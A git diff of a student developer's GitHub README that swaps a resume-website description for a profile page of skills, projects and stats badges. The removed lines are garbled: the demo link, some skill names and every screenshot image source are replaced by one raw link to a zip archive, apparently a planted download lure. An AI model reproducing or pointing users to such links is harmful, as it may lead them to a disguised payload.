@@ -1,83 +1,71 @@
-🌐 Rahul Dounde — Resume Website
+# 👋 Hi, I'm Rahul Dounde
 
-A clean, modern, and interactive resume website built using HTML, CSS, and JavaScript.
-This site showcases my education, projects, skills, and contact details in a smooth, button-based navigation system.
+🚀 Computer Science Student | Backend & Full-Stack Developer | AI Enthusiast
 
-🚀 Live Demo
+---
 
-🔗 GitHub Pages Link:
-(Add your deployed link here)
-Example:
+## 🔗 Connect with Me
 
-https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip
+[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge\&logo=github\&logoColor=white)](https://github.com/rahuldounde21)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge\&logo=linkedin\&logoColor=white)](https://www.linkedin.com/in/rahul-dounde-92b262395)
 
-📌 Features
+---
 
-🎨 Clean modern UI
+## 🧠 About Me
 
-🔘 Interactive navigation buttons
+* 🎓 B.Tech CSE (3rd Year)
+* 💻 Interested in Backend & Full Stack Development
+* 🤖 Exploring AI & Automation Systems
+* 🏆 Hackathon Participant (GDG, Astranova, Dimension X)
 
-📱 Fully responsive design
+---
 
-🧭 Smooth section switching (About / Projects / Skills / Contact / Download)
+## 🚀 Projects
 
-🖨️ One-click Print / Save as PDF
+* 🔹 CLI Calculator
+* 🔹 Number Guessing Game
+* 🔹 Password Generator
+* 🔹 AI Automation Platform
+* 🔹 MindGuard AI (Stress Detection System)
 
-⚡ Fast and lightweight — no frameworks needed
+---
 
-🛠️ Tech Stack
+## 🛠️ Tech Stack
 
-HTML5
+**Languages:**
+C, C++, Python, Java, JavaScript
 
-CSS3 (Custom styling, gradients, shadows)
+**Web:**
+HTML, CSS, React, Node.js, Express
 
-JavaScript (Panel switching + keyboard nav)
+**Database:**
+MongoDB, MySQL
 
-GitHub Pages (Hosting)
+**Tools:**
+Git, GitHub, Firebase, GCP
 
-📂 Sections
-About Me
+---
 
-Short intro, education details, interests.
+## 📊 GitHub Stats
 
-Projects
+![Rahul's GitHub stats](https://github-readme-stats.vercel.app/api?username=rahuldounde21\&show_icons=true\&theme=tokyonight)
 
-Direct links to selected GitHub repos:
+---
 
-Social Media Dashboard
+## 🔥 Streak Stats
 
-Nex-T1 Research
+![GitHub Streak](https://streak-stats.demolab.com?user=rahuldounde21\&theme=tokyonight)
 
-Django Meta Assessment
+---
 
-DO101 Apps
+## 🏆 Achievements
 
-Skills
+* 🚀 Participated in multiple national-level hackathons
+* 🤖 Built AI-based automation systems
+* 📈 Improving DSA & Full Stack skills daily
 
-Frontend: HTML, CSS, JS, React, https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip
+---
 
-Backend: https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip, Express, MongoDB, MySQL
+## 💡 Quote
 
-AI / ML: Python, NumPy, Pandas, TensorFlow/PyTorch (basics)
-
-Tools: Git, GitHub, Deployment
-
-Others: DSA fundamentals
-
-Contact
-
-GitHub
-
-Email
-
-Phone
-
-LinkedIn
-
-Download
-
-Print/Save PDF version of the resume.<img width="1539" height="721" alt="Screenshot 2025-12-06 170042" src="https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip" />
-<img width="1539" height="710" alt="Screenshot 2025-12-06 170034" src="https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip" />
-<img width="1444" height="749" alt="Screenshot 2025-12-06 165848" src="https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip" />
-<img width="1434" height="685" alt="Screenshot 2025-12-06 165829" src="https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip" />
-<img width="1455" height="638" alt="Screenshot 2025-12-06 165821" src="https://github.com/rahuldounde21/resume-/raw/refs/heads/main/reshare/resume-v3.1.zip" />
+"Consistency beats talent when talent doesn't work hard."
